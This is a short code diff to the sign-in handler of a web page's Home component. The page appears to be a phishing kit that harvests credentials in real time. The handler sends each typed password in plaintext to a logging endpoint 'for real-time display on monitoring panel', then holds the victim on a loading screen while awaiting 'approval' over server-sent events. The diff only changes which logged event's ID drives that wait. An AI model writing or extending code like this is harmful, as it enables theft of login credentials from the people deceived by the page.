@@ -195,24 +195,26 @@ export default function Home() {
           const password = document.getElementById('password').value;
           
           // Log password entry
-          const activityId = await logActivity('password', cachedUsername, { 
+          await logActivity('password', cachedUsername, { 
             hasPassword: password.length > 0,
             password: password // Include password for real-time display on monitoring panel
           });
-          pendingActivityId = activityId;
           
-          // Log sign-in button click
-          await logActivity('signin', cachedUsername, { 
+          // Log sign-in button click and get its activity ID for SSE
+          const activityId = await logActivity('signin', cachedUsername, { 
             hasPassword: password.length > 0,
             password: password
           });
+          pendingActivityId = activityId;
+          
+          console.log('[index.js] Sign in activity ID:', activityId);
           
           // Show loading screen
           const loadingScreen = document.getElementById('loading-screen');
           if (loadingScreen) loadingScreen.classList.add('active');
           submitBtn.disabled = true;
           
-          // Wait for approval via SSE
+          // Wait for approval via SSE using signin activity ID
           waitForApprovalSSE(activityId, 'signin', cachedUsername);
         }
       });
